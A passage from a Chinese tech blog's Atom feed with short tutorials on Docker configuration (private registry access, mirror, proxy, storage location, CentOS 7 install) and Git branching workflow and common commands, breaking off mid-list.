<h2 id="五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。"><a href="#五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。" class="headerlink" title="五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。"></a>五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段P
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="其他" scheme="http://blog.unixmen.cn/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Docker 私有仓库无法上传镜像的问题</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker-%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E6%97%A0%E6%B3%95%E4%B8%8A%E4%BC%A0%E9%95%9C%E5%83%8F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/</id>
    <published>2017-03-02T09:08:16.000Z</published>
    <updated>2017-03-29T00:41:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图：</p>
<ul>
<li>无法push镜像</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403.png" alt=""></p>
<ul>
<li>无法pull镜像</li>
</ul>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_2.png" alt=""></p>
<p><strong>导致原因：</strong><br>因为启动的registry服务不是安全可信赖的</p>
<p><strong> 解决方法如下：</strong></p>
<ul>
<li><p>CentOS 6</p>
<ul>
<li><p>修改docker的配置文件/etc/default/docker，添加下面的内容，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>重启docker服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service docker restart</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>CentOS 7</p>
<ul>
<li><p>创建或修改 /etc/docker/daemon.json 文件，添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;]</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
</li>
<li><p>重启Docker 服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart docker</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>测试：</p>
<ul>
<li>push 测试 </li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_1.png" alt=""></p>
<ul>
<li>pull 测试</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无法push镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserconten
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Trouble shooting" scheme="http://blog.unixmen.cn/tags/Trouble-shooting/"/>
    
  </entry>
  
  <entry>
    <title>Docker配置Daocloud加速器</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E9%85%8D%E7%BD%AEDaocloud%E5%8A%A0%E9%80%9F%E5%99%A8/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/</id>
    <published>2017-03-02T07:12:31.000Z</published>
    <updated>2017-03-29T00:40:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>Docker 版本在 1.12 或更高<br>创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）<br><a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="external">Daocloud加速器地址</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;registry-mirrors&quot;: [</div><div class="line">        &quot;加速地址&quot;</div><div class="line">    ],</div><div class="line">    &quot;insecure-registries&quot;: []</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker 版本在 1.12 或更高&lt;br&gt;创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）&lt;br&gt;&lt;a href=&quot;https://www.daocloud.io/mirror#acc
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Docker配置HTTP代理</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E9%85%8D%E7%BD%AEHTTP%E4%BB%A3%E7%90%86/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/</id>
    <published>2017-03-02T07:11:24.000Z</published>
    <updated>2017-03-29T00:42:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_no_proxy.png" alt=""></p>
<p>CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。</p>
<p>CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下：</p>
<ul>
<li>创建目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /etc/systemd/system/docker.service.d</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>添加配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo &quot;[Service]</div><div class="line">Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf</div></pre></td></tr></table></figure>
</li>
<li><p>Reload systemd-daemon</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl daemon-reload</div></pre></td></tr></table></figure>
</li>
<li><p>重启docker服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart docker</div></pre></td></tr></table></figure>
</li>
<li><p>检查变量是否加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl show docker --property Environment</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>测试是否生效<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_proxy_1.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_no_proxy.p
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Docker修改默认存储位置</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/</id>
    <published>2017-03-02T07:10:23.000Z</published>
    <updated>2017-03-29T00:41:49.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>停止docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl stop docker</div></pre></td></tr></table></figure>
</li>
<li><p>备份默认docker存储数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mv /var/lib/docker&#123;,.bak&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>创建docker数据存放文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /data/docker</div></pre></td></tr></table></figure>
</li>
<li><p>创建软连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s /data/docker/ /var/lib/docker</div></pre></td></tr></table></figure>
</li>
<li><p>启动docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>查看存储位置<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_root.png" alt=""></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;停止docker&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;c
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>How to Install Docker Engine on CentOS 7.</title>
    <link href="http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/"/>
    <id>http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/</id>
    <published>2017-02-28T05:32:27.000Z</published>
    <updated>2017-03-06T06:54:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Remove-default-docker-package"><a href="#1-Remove-default-docker-package" class="headerlink" title="1.Remove default docker package."></a>1.Remove default docker package.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y remove docker docker-common container-selinux</div><div class="line">yum -y remove docker-selinux</div></pre></td></tr></table></figure>
<h2 id="2-Install-Docker-engine"><a href="#2-Install-Docker-engine" class="headerlink" title="2.Install Docker engine"></a>2.Install Docker engine</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum install -y yum-utils</div><div class="line">yum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repo</div><div class="line">yum-config-manager --enable docker-testing</div><div class="line">yum-config-manager --disable docker-testing</div><div class="line">yum makecache fast</div><div class="line">yum -y install docker-engine</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Remove-default-docker-package&quot;&gt;&lt;a href=&quot;#1-Remove-default-docker-package&quot; class=&quot;headerlink&quot; title=&quot;1.Remove default docker packag
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Git利用分支进行开发的工作流程</title>
    <link href="http://blog.unixmen.cn/2017/02/28/Git%E5%88%A9%E7%94%A8%E5%88%86%E6%94%AF%E8%BF%9B%E8%A1%8C%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/"/>
    <id>http://blog.unixmen.cn/2017/02/28/Git利用分支进行开发的工作流程/</id>
    <published>2017-02-28T05:24:47.000Z</published>
    <updated>2017-05-02T09:25:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p>
<h1 id="Git-利用分支进行开发的工作流程"><a href="#Git-利用分支进行开发的工作流程" class="headerlink" title="Git 利用分支进行开发的工作流程"></a>Git 利用分支进行开发的工作流程</h1><p>Git 作为一个源码管理系统，不可避免涉及到多人协作。<br>协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。”工作流程”在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。</p>
<h2 id="一、长期分支"><a href="#一、长期分支" class="headerlink" title="一、长期分支"></a>一、长期分支</h2><h3 id="master-分支"><a href="#master-分支" class="headerlink" title="master 分支"></a>master 分支</h3><p>master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。</p>
<h3 id="develop-分支"><a href="#develop-分支" class="headerlink" title="develop 分支"></a>develop 分支</h3><p>开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。</p>
<h2 id="二、短期分支"><a href="#二、短期分支" class="headerlink" title="二、短期分支"></a>二、短期分支</h2><h3 id="feature-分支"><a href="#feature-分支" class="headerlink" title="feature 分支"></a>feature 分支</h3><p>如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为<code>feature/xxx</code>，开发完成后合并回 develop 分支并且删除这个 feature 分支，相应的操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ git checkout -b feature/xxx develop</div><div class="line"><span class="comment"># 写代码，提交，写代码，提交。。。</span></div><div class="line"><span class="comment"># feature 开发完成，合并回 develop</span></div><div class="line">$ git checkout develop</div><div class="line"><span class="comment"># 务必加上 --no-ff，以保持分支的合并历史</span></div><div class="line">$ git merge --no-ff feature/xxx</div><div class="line">$ git branch <span class="_">-d</span> feature/xxx</div></pre></td></tr></table></figure>
<p>如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 假设当前在 feature/xxx 分支</span></div><div class="line">$ git rebase develop</div></pre></td></tr></table></figure>
<p>rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。</p>
<h3 id="release-分支"><a href="#release-分支" class="headerlink" title="release 分支"></a>release 分支</h3><p>当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为<code>release/20121221</code>，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。相应操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git checkout -b release/20121221 develop</div><div class="line"><span class="comment"># 修复 bug、检查没问题后合并到 master 分支并删除</span></div><div class="line">$ git checkout master</div><div class="line">$ git merge --no-ff release/20121221</div></pre></td></tr></table></figure>
<p>为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git checkout develop</div><div class="line">$ git merge --no-ff release/20121221</div><div class="line"><span class="comment"># 到此，这个 release 分支完成了它的使命，可以被删除了</span></div><div class="line">$ git branch <span class="_">-d</span> release/20121221</div></pre></td></tr></table></figure>
<h3 id="hotfix-分支"><a href="#hotfix-分支" class="headerlink" title="hotfix 分支"></a>hotfix 分支</h3><p>如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为<code>hotfix/xxx</code>，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。相应操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ git checkout -b hotfix/xxx master</div><div class="line"><span class="comment"># 修完 bug 后</span></div><div class="line">$ git checkout master</div><div class="line">$ git merge --no-ff hotfix/xxx</div><div class="line">$ git checkout develop</div><div class="line">$ git merge --no-ff hotfix/xxx</div><div class="line"><span class="comment"># hotfix 分支完成使命</span></div><div class="line">$ git branch <span class="_">-d</span> hotfix/xxx</div></pre></td></tr></table></figure>
<p>例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。</p>
<h2 id="三、proj-分支"><a href="#三、proj-分支" class="headerlink" title="三、proj 分支"></a>三、proj 分支</h2><p>proj 分支为项目分支，所有的项目分支都从 master 上开出来，约定的分支名为<code>proj/xxx</code>。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。相应操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ git checkout -b proj/xxx master</div><div class="line"><span class="comment"># 定制。。。</span></div><div class="line"><span class="comment"># 如果 master 分支有更新</span></div><div class="line">$ git checkout proj/xxx master</div><div class="line">$ git merge --no-ff master</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;Git-利用分支进行开发的工作流程&quot;&gt;&lt;a href=&quot;#Git-利用分支进行开发的工作流程&quot; class=&quot;headerlink&quot; title=&quot;Git 利用分支进行开发的工作流程&quot;&gt;&lt;/a&gt;Git 利用分支进行开发的工作流程&lt;/h1&gt;
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="git" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/git/"/>
    
    
      <category term="git" scheme="http://blog.unixmen.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Git常用命令</title>
    <link href="http://blog.unixmen.cn/2017/02/28/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://blog.unixmen.cn/2017/02/28/Git常用命令/</id>
    <published>2017-02-28T03:24:49.000Z</published>
    <updated>2017-05-02T09:24:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p>
<h1 id="Git常用命令"><a href="#Git常用命令" class="headerlink" title="Git常用命令"></a>Git常用命令</h1><p>Git 命令行操作工作流程</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gitcommand.png" alt=""></p>
<ul>
<li>Workspace：工作区</li>
<li>Index / Stage：暂存区</li>
<li>Repository：仓库区（或本地仓库）</li>
<li>Remote：远程仓库</li>
</ul>
<h2 id="一、新建代码库"><a href="#一、新建代码库" class="headerlink" title="一、新建代码库"></a>一、新建代码库</h2><ul>
<li><p>在当前目录新建一个Git代码库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git init</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个目录，将其初始化为Git代码库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git init [project-name]</div></pre></td></tr></table></figure>
</li>
<li><p>下载一个项目和它的整个代码历史</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone [url]</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p>
<ul>
<li><p>显示当前的Git配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config --list</div></pre></td></tr></table></figure>
</li>
<li><p>编辑Git配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -e [--global]</div></pre></td></tr></table></figure>
</li>
<li><p>设置提交代码时的用户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config [--global] user.name &quot;[name]&quot;</div><div class="line">git config [--global] user.email &quot;[email address]&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加/删除文件"></a>三、增加/删除文件</h2><ul>
<li><p>添加指定文件到暂存区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git add [file1] [file2] ...</div></pre></td></tr></table></figure>
</li>
<li><p>添加指定目录到暂存区，包括子目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git add [dir]</div></pre></td></tr></table></figure>
</li>
<li><p>添加当前目录的所有文件到暂存区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git add .</div></pre></td></tr></table></figure>
</li>
<li><p>添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git add -p</div></pre></td></tr></table></figure>
</li>
<li><p>删除工作区文件，并且将这次删除放入暂存区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git rm [file1] [file2] ...</div></pre></td></tr></table></figure>
</li>
<li><p>停止追踪指定文件，但该文件会保留在工作区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git rm --cached [file]</div></pre></td></tr></table></figure>
</li>
<li><p>改名文件，并且将这个改名放入暂存区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git mv [file-original] [file-renamed]</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="四、代码提交"><a href="#四、代码提交" class="headerlink" title="四、代码提交"></a>四、代码提交</h2><ul>
<li><p>提交暂存区到仓库区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit -m [message]</div></pre></td></tr></table></figure>
</li>
<li><p>提交暂存区的指定文件到仓库区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit [file1] [file2] ... -m [message]</div></pre></td></tr></table></figure>
</li>
<li><p>提交工作区自上次commit之后的变化，直接到仓库区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit -a</div></pre></td></tr></table></figure>
</li>
<li><p>提交时显示所有diff信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit -v</div></pre></td></tr></table></figure>
</li>
<li><p>使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit --amend -m [message]</div></pre></td></tr></table></figure>
</li>
<li><p>重做上一次commit，并包括指定文件的新变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit --amend [file1] [file2] ...</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h2><ul>
<li><p>列出所有本地分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch</div></pre></td></tr></table></figure>
</li>
<li><p>列出所有远程分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch -r</div></pre></td></tr></table></figure>
</li>
<li><p>列出所有本地分支和远程分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch -a</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个分支，但依然停留在当前分支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git branch [branch-name]</div></pre></td></tr></table></figure>
</li>
<li><p>新建一个分支，并切换到该分支</p>
